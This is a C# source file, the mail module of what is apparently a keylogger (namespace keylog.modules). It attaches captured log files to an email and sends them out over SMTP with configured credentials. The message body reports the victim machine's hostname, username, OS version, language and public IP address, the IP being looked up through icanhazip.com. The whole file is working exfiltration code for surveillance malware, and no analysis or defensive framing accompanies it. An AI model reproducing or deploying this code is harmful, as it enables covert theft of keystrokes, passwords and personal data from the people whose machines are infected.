using System;
using System.Collections.Generic;
using System.Linq;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Diagnostics;

namespace keylog.modules
{
    public class Mail : Module
    {
        private Dictionary<String, String> userSettings;
        private Dictionary<String, String> serverSettings;
        private List<String> attachments;

        public Mail(Dictionary<String, String> userSettings, Dictionary<String, String> serverSettings, List<String> attachments) : base("Mail")
        {
            this.userSettings = userSettings;
            this.serverSettings = serverSettings;
            this.attachments = attachments;
        }

        public override void Execute()
        {
            MailSend();
        }

        /**
         * Make the mail message, add all the attachments
         * and sends it */
        private void MailSend()
        {
            MailMessage mail = MakeMailMessage();
            //Only send if the file to attach exists
            if (attachments!=null && attachments.Any())
            {
                for(int i=0; i<attachments.Count; i++)
                { 
                    mail = AddMailAttachment(mail, attachments[i]);
                }         
            }
            SmtpSend(mail);
        }

        /**
         * Add attachment to a mail
         * @param mail: Mail to add attachments
         * @param strAttachment: Attachment to add
         * @return: mail with attachments */
        private MailMessage AddMailAttachment(MailMessage mail, String strAttachment)
        {
            if (File.Exists(strAttachment))
            {
                Attachment attachment;
                String newCopy = Path.GetDirectoryName(strAttachment) + "\\" + Path.GetFileNameWithoutExtension(strAttachment) +".txt";
                try
                {
                    File.Copy(strAttachment, newCopy, true);
                }
                catch(Exception e)
                {
                    Debugger.Log(0, null, e.ToString());
                }
                attachment = new Attachment(newCopy);
                mail.Attachments.Add(attachment);
            }
            return mail;
        }

      /**
       * Make the mail message
       * @return: mail with a message */
        private MailMessage MakeMailMessage()
        {
            MailMessage mail = new MailMessage(userSettings["from"], userSettings["to"], userSettings["subject"], userSettings["body"]);
            return mail;
        }

        /**
         * Send a mail with smtp 
         * @param mail: mail to send */
        private void SmtpSend(MailMessage mail)
        {
            SmtpClient SmtpServer = new SmtpClient(serverSettings["smtpServer"]);
            SmtpServer.Port = Convert.ToInt32(serverSettings["port"]);
            SmtpServer.Credentials = new NetworkCredential(serverSettings["user"], serverSettings["password"]);
            SmtpServer.EnableSsl = true;
            try
            {
                SmtpServer.Send(mail);
                mail.Dispose();
            }
            catch (Exception e)
            {
                Debugger.Log(0, null, e.ToString());
            }
        }

        /**
         * @return: Header formated for a mail */
        public static String GetMailHeaderContent()
        {
            String identificator = Environment.MachineName + Environment.UserName + Environment.OSVersion + CultureInfo.CurrentCulture;
            String content = "["+ GetHash(identificator) +"]"+" "+" Caution with the sharks!";
            return content;
        }

        /**
         * @return: Body formated for a mail */
        public static String GetMailBodyContent()
        {
            String content = "";
            try
            {
                content = "Hostname: " + Environment.MachineName + Environment.NewLine +
                "Username: " + Environment.UserName + Environment.NewLine +
                "OS: " + Environment.OSVersion + Environment.NewLine +
                "IP: " + new WebClient().DownloadString("http://icanhazip.com") +
                "Language: " + CultureInfo.CurrentCulture + Environment.NewLine;
            }
            catch (Exception e)
            {
                Debugger.Log(0, null, e.ToString());
            }
            return content;
        }
    }
}
